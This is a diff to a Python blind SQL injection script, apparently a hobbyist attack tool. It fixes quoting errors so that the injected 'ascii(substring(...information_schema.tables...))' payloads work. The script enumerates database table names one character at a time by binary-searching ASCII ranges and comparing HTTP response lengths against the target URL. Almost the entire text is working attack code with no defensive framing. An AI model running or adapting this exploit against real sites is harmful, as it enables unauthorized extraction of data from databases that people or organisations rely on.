@@ -234,8 +234,8 @@ if __name__ == "__main__":
 		print("[+]--- WORKING ON TABLE %s" % str(q))
 		for i in range(1,table_name_lengths[q]):
 			#YO BOIS GOT HIS FREE TACOOOO
-			sqli_url = url + " and ascii(substring((select table_name from information_schema.tables where table_schema='"+cur_db_name+'" limit "+str(q)+",1),"+str(i)+",1))>=43#"
-			sqli_url = sqli_url + " and ascii(substring((select table_name from information_schema.tables where table_schema='"+cur_db_name+'" limit "+str(q)+",1),"+str(i)+",1))<=122#"
+			sqli_url = url + " and ascii(substring((select table_name from information_schema.tables where table_schema='"+cur_db_name+"' limit "+str(q)+",1),"+str(i)+",1))>=43#"
+			sqli_url = sqli_url + " and ascii(substring((select table_name from information_schema.tables where table_schema='"+cur_db_name+"' limit "+str(q)+",1),"+str(i)+",1))<=122#"
 			try:
 				res_bad = requests.get(sqli_url)
 			except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
@@ -250,21 +250,21 @@ if __name__ == "__main__":
 			#TIME TO GET INTERESTING...
 			lower=0;
 			upper=0;
-			sqli_url = url + " and ascii(substring((select table_name from information_schema.tables where table_schema='"+cur_db_name+'" limit "+str(q)+",1),"+str(i)+",1))>=83#"
+			sqli_url = url + " and ascii(substring((select table_name from information_schema.tables where table_schema='"+cur_db_name+"' limit "+str(q)+",1),"+str(i)+",1))>=83#"
 			try:
 				res_bad = requests.get(sqli_url)
 			except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
 				print("[+]--- SOMETHING WENT WRONG!!!!")
 				sys.exit()
 			if( len(res_bad.text)==len(res_good.text) ):
-				sqli_url = url + " and ascii(substring((select table_name from information_schema.tables where table_schema='"+cur_db_name+'" limit "+str(q)+",1),"+str(i)+",1))>=103#"
+				sqli_url = url + " and ascii(substring((select table_name from information_schema.tables where table_schema='"+cur_db_name+"' limit "+str(q)+",1),"+str(i)+",1))>=103#"
 				try:
 					res_bad = requests.get(sqli_url)
 				except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
 					print("[+]--- SOMETHING WENT WRONG!!!!")
 					sys.exit()
 				if( len(res_bad.text)==len(res_good.text) ):
-					sqli_url = url + " and ascii(substring((select table_name from information_schema.tables where table_schema='"+cur_db_name+'" limit "+str(q)+",1),"+str(i)+",1))>=113#"
+					sqli_url = url + " and ascii(substring((select table_name from information_schema.tables where table_schema='"+cur_db_name+"' limit "+str(q)+",1),"+str(i)+",1))>=113#"
 					try:
 						res_bad = requests.get(sqli_url)
 					except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
@@ -280,7 +280,7 @@ if __name__ == "__main__":
 						upper = 133
 				else:
 
-					sqli_url = url + " and ascii(substring((select table_name from information_schema.tables where table_schema='"+cur_db_name+'" limit "+str(q)+",1),"+str(i)+",1))>=93#"
+					sqli_url = url + " and ascii(substring((select table_name from information_schema.tables where table_schema='"+cur_db_name+"' limit "+str(q)+",1),"+str(i)+",1))>=93#"
 					try:
 						res_bad = requests.get(sqli_url)
 					except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
@@ -295,14 +295,14 @@ if __name__ == "__main__":
 						lower = 83
 						upper = 93
 			else:
-				sqli_url = url + " and ascii(substring((select table_name from information_schema.tables where table_schema='"+cur_db_name+'" limit "+str(q)+",1),"+str(i)+",1))>=63#"
+				sqli_url = url + " and ascii(substring((select table_name from information_schema.tables where table_schema='"+cur_db_name+"' limit "+str(q)+",1),"+str(i)+",1))>=63#"
 				try:
 					res_bad = requests.get(sqli_url)
 				except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
 					print("[+]--- SOMETHING WENT WRONG!!!!")
 					sys.exit()
 				if( len(res_bad.text)==len(res_good.text) ):
-					sqli_url = url + " and ascii(substring((select table_name from information_schema.tables where table_schema='"+cur_db_name+'" limit "+str(q)+",1),"+str(i)+",1))>=73#"
+					sqli_url = url + " and ascii(substring((select table_name from information_schema.tables where table_schema='"+cur_db_name+"' limit "+str(q)+",1),"+str(i)+",1))>=73#"
 					try:
 						res_bad = requests.get(sqli_url)
 					except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
@@ -318,7 +318,7 @@ if __name__ == "__main__":
 						upper = 73
 				else:
 
-					sqli_url = url + " and ascii(substring((select table_name from information_schema.tables where table_schema='"+cur_db_name+'" limit "+str(q)+",1),"+str(i)+",1))>=53#"
+					sqli_url = url + " and ascii(substring((select table_name from information_schema.tables where table_schema='"+cur_db_name+"' limit "+str(q)+",1),"+str(i)+",1))>=53#"
 					try:
 						res_bad = requests.get(sqli_url)
 					except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
@@ -334,7 +334,7 @@ if __name__ == "__main__":
 						upper = 53
 			for j in range(lower,upper):
 				#YOU ALREADY KNOW WHAT IT IS ;)
-				sqli_url = url + " and ascii(substring((select table_name from information_schema.tables where table_schema='"+cur_db_name+'" limit "+str(q)+",1),"+str(i)+",1))="+str(j)+"#"
+				sqli_url = url + " and ascii(substring((select table_name from information_schema.tables where table_schema='"+cur_db_name+"' limit "+str(q)+",1),"+str(i)+",1))="+str(j)+"#"
 				try:
 					res_bad = requests.get(sqli_url)
 				except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
